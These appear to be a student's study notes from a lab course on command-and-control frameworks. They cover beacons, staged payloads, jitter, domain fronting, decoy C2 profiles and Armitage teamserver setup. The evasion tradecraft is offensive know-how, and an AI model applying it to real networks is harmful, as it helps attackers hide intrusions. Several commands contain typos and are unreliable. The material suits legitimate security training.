Command and Control (C2)
-manage compromised devices during an engagement and often help aid in lateral movement

Command and Control Framework
-Almost all C2 frameworks require a special payload generator
-eg. Metasploit -> MSFVenom (payload generator)

C2 Server
-serves as a hub for agents to call back to
-agents will periodically reach out to C2 servers and wait for the operator's commands

Agents / Payloads
-Agent: program generated by the C2 framework that calls back to a listner on a C2 server
-configurable with adjustments on timing of how often C2 agents becon out to a Listener on a C2 Server and more

Listeners
-application running on C2 server that waits for a callback

Beacons
-process of a C2 Agent calling back to the listner running on a C2 Server

Obfuscating Agent Callbacks
-Sleep Timers: C2 traffic beaconing rate forms a pattern forming a sleep timer
-Jitter: takes sleep timer and adds variation - create normal traffic apperance

Payload Types
-Staged and Stageless payloads
-Stageless Payloads: 
A. Victim workstation downloads and executes the Dropper
B. The beaconing to the C2 Server begins

-Staged: requires additional files from the C2 Server
A. Victim workstation downloads and executes the Dropper
B. Dropper calls back to C2 Server for Stage 2
C. C2 Server receives message and sends Stage 2 to victim workstation
D. Stage 2 is loaded into memory of victim workstation
E. The beconing to the C2 Server begins

Payload Formats: 
1. PowerShell Scripts
2. HTA Files
3. JS files
4. Visual Basic Apps/Scripts
5. MS Office Docs

Modules
-Written in multiple languages, give more flexibility
-Post Exploitation Modules: modules after inital compromise. Eg. finding paths for lateral movement and parsing credentials etc
-Pivoting Modules: SMB pivot to communicate with restricted network segment from computer with admin access

Domain Fronting
-utilize a good host
-make it appear a workstation is communicating with a known, trusted IP address
-victim only communicates with trusted site
-commands are proxied through trusted site to the victim stations

C2 Profiles
-Server looks at user agent to determine if HTTp request came from a becon or other device
-if from a compromised device, it returns a C2 command
-if from a non compromised device, it returns normal webpage

Common C2 Frameworks
-free frameworks are well understood, and signatures can be easily developed.

Free C2 Frameworks
1. Metasploit - developed by Rapid7 - most popuar exploit and post-exploitation framework
2. Armitage - extension of metasploit - adds a GUI - written in Java - fast and easy
3. Powershell Empire/Starkiller - developed by the Veris Group - updated by BC Security team - versitile (THM ROOM )
4. Covenant - developed by Ryan Cobb - written in C# - used in Post-exploit and lateral movement w/ HTTP, HTTPS, SMB
5. Silver - developed by Bishop Fox - written in Go - various protocols for communication - mask communications and encrypted communication 

Paid C2 Frameworks
1. Cobalt Strike - developed by Help Systems Raphael Mudge - written in Java - flexible
2. Brute Ratel - developed by Chetan Nayak - customizable command and control center

Other C2 Frameworks
1. C2 Matrix - developed by Jorge Orchilles and Bryson Bort

Setting up Armitage

1. git clone https://gitlab.com/kalilinux/packages/armitage.git
2. cd armitage
3. bash package.sh

Teamserver - takes IP address and Shared Password arguments
Armitage - enter host, port, username, password

preparing env
systemctl start postgresqul && stemctl status postgresql
msfdb --use-defaults delete
msfdb --use-defaults init

connecting to Armitage
cd /artimage/release/unix && ./teamserver <yourIP> <Password>
-must listen with tun0/eth0 IP address not local host

-------------------------------------------------------------------------------------------------------------------------------------------------------------------

Accessing and managing your C2 infrastructure
-SSH port-forwarding

Standard: TCP or UDP
HTTP/HTTPS: firewall with protocol inspection, Domain fronting or malleable c2 profiles
DNS: device that cannont easily access internet; - https://2017.zeronights.org/wp-content/uploads/materials/ZN17_SintsovAndreyanov_MeterpreterReverseDNS.pdf
SMB: flexible pivoting, accessing restricted network segment

------------------------------------------------------------------------------------------------------------------------------------------------------------------

AttackBox

1. Setup
systemctl start postgresql && systemctl status postgresql
su ubuntu
msfdb --use-defaults delete
msfdb --use-defaults init
cd /opt/armitage/release/unix
./teamserver [yourAttackBoxIP] [password] - (returns info)
./armitage (enter info returned above)

2. Scan
Hosts > Nmap Scan > Quick Scan > [IP Ted-PC/32]
